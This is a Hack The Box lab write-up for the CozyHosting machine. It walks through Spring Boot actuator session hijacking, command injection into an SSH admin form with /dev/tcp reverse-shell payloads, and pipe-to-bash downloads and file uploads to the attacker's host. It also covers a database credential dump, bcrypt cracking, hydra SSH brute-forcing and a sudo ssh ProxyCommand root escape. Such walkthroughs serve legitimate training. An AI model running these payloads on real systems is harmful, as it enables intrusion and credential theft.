# HTB: CozyHosting

Lets nmap $TARGET

```bash
$ nmap -oA recon/nmap/quick $TARGET
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.10.11.230
Host is up (0.039s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8083/tcp open  us-srv
8888/tcp open  sun-answerbook

Nmap done: 1 IP address (1 host up) scanned in 6.25 seconds
```

Quite a few odd ports open. lets start a more in depth scan and take a look at the website on port 80.

```BASH
$ sudo nmap -sT -sU -sC -sV -oA recon/nmap/full -p- -v3 --min-rate 10000 $TARGET
$ firefox http://$TARGET &
```

We're redirected to `http://cozyhosting.htb/` but since there's no DNS server to resolve the domain and the server seemingly only responding to requests targeted at `cozyhosting.htb` the page doesn't load. lets add `cozyhosting.htb` to `/etc/hosts`:

```bash
$ sudo bash -c "echo ${TARGET} cozyhosting.htb >> /etc/hosts"
```

Refreshing the page again we can access what looks like a hosting website.

![View of the main website](Assets/hosting_page.jpg)

Since there seems to be quite a few buttons lets run an automated scan using zapproxy to spider to website and maybe pickup on something interesting (active crawling is not available in free version of burp suite)

![View of the quick start page of zap proxy](Assets/zap_spider.jpg)

While at it lets run a vhost fuzzer since the website uses a domain name and run a generic feroxbuster dir bust:

```bash
$ gobuster vhost -u http://cozyhosting.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o recon/vhostbust
 ... output omitted, nothing interesting ...
$ feroxbuster -u http://cozyhosting.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt -o recon/feroxMedWords
$ echo "Ignoring template assets"; cat feroxMedWords | grep -v assets
Ignoring template assets
401      GET        1l        1w       97c http://cozyhosting.htb/admin
204      GET        0l        0w        0c http://cozyhosting.htb/logout
200      GET      285l      745w    12706c http://cozyhosting.htb/index
200      GET       97l      196w     4431c http://cozyhosting.htb/login
500      GET        1l        1w       73c http://cozyhosting.htb/error
200      GET      285l      745w    12706c http://cozyhosting.htb/
```

We see that there's an admin page that we don't have access to so the login page becomes really interesting:

![login page of the website](Assets/login_page.jpg)

Since we don't really know the tech stack used to build the app yet lets run a special character fuzz with burp suite + sqlmap and try to figure out how the website is built.

```bash
$ sqlmap --forms --level 5 -risk 3 -u http://cozyhosting.htb/login
 ... nothing interesting ...
```

![Burp suite intruder windows showing the fuzzed fields](Assets/burp_special_char_fuzz.jpg)

While intercepting the login request for burp suite fuzz we can see in the response that the server sets a `JSESSIONID` cookie. Is the back end based on java? Lets keep digging.

![Response to the login request show in burp suite](Assets/jess_cokie_from_login_resp.jpg)

Going to a non existing page we get an error, googling it mentions spring boot framework. This checks out with the cookie.

![Whitelabel Error Page of spring boot](Assets/error_page_web.jpg)

Since there seems to be a spring specific word list in SecLists lets run that with feroxbuster:

```bash
$ echo "Ignoring template assets"; cat feroxMedWords | grep -v assets
Ignoring template assets
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/tz
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/lang
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/pwd
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/home
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/language
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/path
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/hostname
200      GET        1l        1w      398c http://cozyhosting.htb/actuator/sessions
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/spring.jmx.enabled
200      GET       97l      196w     4431c http://cozyhosting.htb/login
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
200      GET        1l      108w     9938c http://cozyhosting.htb/actuator/mappings
200      GET      285l      745w    12706c http://cozyhosting.htb/
```

Googling "spring boot exploit" seems to also mention actuators. Since the fuzz didn't show any endpoints with known RCE vectors next interesting targets are the sessions, env and mappings actuators.

```bash
$ wget http://cozyhosting.htb/actuator/mappings && cat mappings | jq
 ... filtered for interesting ...
{
  "handler": "ParameterizableViewController [view=\"admin\"]",
  "predicate": "/admin"
},
{
  "handler": "ParameterizableViewController [view=\"addhost\"]",
  "predicate": "/addhost"
},
{
  "handler": "ParameterizableViewController [view=\"index\"]",
  "predicate": "/index"
},
{
  "handler": "ParameterizableViewController [view=\"login\"]",
  "predicate": "/login"
},
{
  "handler": "ResourceHttpRequestHandler [classpath [META-INF/resources/webjars/]]",
  "predicate": "/webjars/**"
},
{
  "handler": "ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]",
  "predicate": "/**"
}

{
  "handler": "htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)",
  "predicate": "{POST [/executessh]}",
  "details": {
    "handlerMethod": {
      "className": "htb.cloudhosting.compliance.ComplianceService",
      "name": "executeOverSsh",
      "descriptor": "(Ljava/lang/String;Ljava/lang/String;Ljakarta/servlet/http/HttpServletResponse;)V"
    },
    "requestMappingConditions": {
      "consumes": [],
      "headers": [],
      "methods": [
        "POST"
      ],
      "params": [],
      "patterns": [
        "/executessh"
      ],
      "produces": []
    }
  }
},

$ wget http://cozyhosting.htb/actuator/env && cat env | jq
 ... nothing interesting ...

$ wget http://cozyhosting.htb/actuator/sessions && cat sessions | jq
{
  "D697FB35FF53E43D1718B88D7081C354": "kanderson"
}
```

Seems like someone else is logged in currently. lets use their session cookie and see if we can access /admin.

![Editing the cookie using the firefox dev tools](Assets/firefox_changing_cookie.jpg)

Refreshing the page it seems that we're logged in!

![Login button is missing from page. Assuming successful login.](Assets/logged_in.jpg)

Going to the admin panel we're greeted with what looks like some kind of automated patching over ssh tool.

![View of the admin panel from /admin](Assets/admin_panel.jpg)

The submit functionality seems use the /execssh endpoint previously identified as interesting in the json from the mapping actuator.

```bash
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://cozyhosting.htb/admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://cozyhosting.htb
DNT: 1
Connection: close
Cookie: JSESSIONID=3586E192A88DFAD844F500F81A8E36AD
Upgrade-Insecure-Requests: 1

host=localhost&username=root

```

Redirects to: `http://cozyhosting.htb/admin?error=Host%20key%20verification%20failed.` (This looks like an xxs vector but seems to be escaped properly)

lets fuzz the form with special characters using burp suite again.

![Showing intruder page in burp suite setting up fuzz](Assets/ssh_form_fuzz_burp.jpg)

It seems the error parameter has the output of the ssh command.

![http response showing ssh output passed in as the err param](Assets/burp_ssh_output_in_err.jpg)

Possibly vulnerable to command injection? lets try some payloads.

`host=localhost&username=$(curl 10.10.14.30:8000)` results in: `Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!`. [Hacktricks](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) seems to have quite a bit of good content on this. lets try the short rev shell trick.

Start the listener:

```bash
$ nc -lvnp 9001
```

`host=localhost&username=(sh)0>/dev/tcp/10.10.13.30/9001` Seems to cause an error: `Location: http://cozyhosting.htb/admin?error=/bin/bash: -c: line 1: syntax error near unexpected token (\'/bin/bash: -c: line 1: ssh -o ConnectTimeout=1 (sh)0>/dev/tcp/10.10.13.30/9001@localhost'`. Since the parameter seems to go directly into the username it throws an error. lets make bash use the return of the shell payload as the username with `$()`, `host=localhost&username=$((sh)0>/dev/tcp/10.10.13.30/9001)`

Sending:

```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://cozyhosting.htb/admin?error=Invalid%20hostname!
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://cozyhosting.htb
DNT: 1
Connection: close
Cookie: JSESSIONID=08D7A2D967BFBD7D02FE7187AD273C6E
Upgrade-Insecure-Requests: 1

host=localhost&username=$((sh)0>/dev/tcp/10.10.13.30/9001)

```

Gives us a shell! lets run `exec >&0` as stated in the instruction on hacktricks.

```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.230] 41668
exec >&0
ls
cloudhosting-0.0.1.jar
pwd
/app

```

Since this shell is likely very fragile lets upgrade it:

Start the listener ([found on this blog post](https://medium.com/@Thigh_GoD/how-to-automatically-upgrade-a-dumb-reverse-shell-6a4cb5c44997))

```bash
stty raw -echo; stty size && rcat l -ie "script -qc /bin/bash /dev/null" 9002 && reset
```

running the payload directly in the existing shell seems to break it. We'll need to cradle it:

```bash
$ cat "/bin/bash -i >& /dev/tcp/10.10.14.30/9002 0>&1" > sh
$ python -m http.server
```

Then download it and run using the existing shell we have:

```bash
$ curl 10.10.14.30:8000/sh | /bin/bash
```

And we get a nice upgraded shell!

Right off the bat we can see a jar file and guessing from the filename, username, and directory we can assume it's the source of the web app we've been dealing with. Never the less lets run linpeas:

```bash
$ py -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

start a listener to capture linpeas output:

```bash
$ nc -lp 9002 | tee recon/linpeaoutput
```

and fire off linpeas

```bash
$ curl 10.10.14.30:8000/p | bash &> /dev/tcp/10.10.14.30/9001 &
```

lets also upload the jar file so we can have a closer look:

```bash
$ which python3
/usr/bin/python3
$ python3 -c 'import requests;requests.post("http://10.10.14.30:8000/upload",files={"files":open("cloudhosting-0.0.1.jar","rb")})'
```

Running [Floss](https://github.com/mandiant/flare-flosshttps://github.com/mandiant/flare-floss) doesn't seem to work so lets get right to decompilation:

```bash
$ floss cloudhosting-0.0.1.jar
INFO: floss: extracting static strings...
ERROR: floss: cannot deobfuscate strings from files larger than 0x1000000 bytes
$ floss --only static -- cloudhosting-0.0.1.jar > recon/flossStrings
```

Currently the commonly suggested decompiler seems to be [vineflower](https://vineflower.org/) so lets use that.

```bash
$ java -jar vineflower.jar cloudhosting-0.0.1.jar cloudhosting
$ cat cloudhosting/BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
$ cat cloudhosting/BOOT-INF/classes/htb/cloudhosting/database/CozyUser.java
package htb.cloudhosting.database;

import jakarta.persistence.Column;
import jakarta.persistence.Entity;
import jakarta.persistence.Id;
import jakarta.persistence.Table;

@Entity
@Table(
   name = "users",
   schema = "public"
)
 ... snip ...
```

Some creds and the table schema here! lets dump the DB.

```bash
app@cozyhosting:/app$ psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost:5432/cozyhosting" -c 'SELECT * FROM users'
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

lets start cracking the hashes and have a look through the linpeas output:

```bash
$ hashcat --user hashes -m 3200 rockyou.txt
```

Nothing really interesting in linpeas output but we get a from password hashcat!

```bash
$ hashcat --user hashes -m 3200 rockyou.txt --show
admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

lets run hydra on the on ssh and see if we can get logged in:

```BASH
$ cat loot/leaked_passwd | grep sh$ | awk -F ':' '{print $1}' | tee loot/leakedUsers
root
app
postgres
josh
$ echo "kanderson" >> loot/leakedUsers
$ echo "admin" >> loot/leakedUsers
$ cat loot/leakedUsers /opt/SecLists/Usernames/top-usernames-shortlist.txt > /tmp/users
$ cat loot/leakedPass /opt/SecLists/Passwords/darkweb2017-top10000.txt > /tmp/passlist
$ hydra -L /tmp/users -P /tmp/passlist $TARGET ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
[DATA] attacking ssh://10.10.11.230:22/
[22][ssh] host: 10.10.11.230   login: josh   password: manchesterunited
1 of 1 target successfully completed, 1 valid password found
```

We got a login! Lets again run linpeas in the background while we look around manually (linpeas doesn't find anything interesting, steps are the same as previously):

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

user josh can run ssh as root, GTFO bins says the breakout into a shell is as easy as running:

```bash
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
$ id
uid=0(root) gid=0(root) groups=0(root)
```

and we get a root shell!
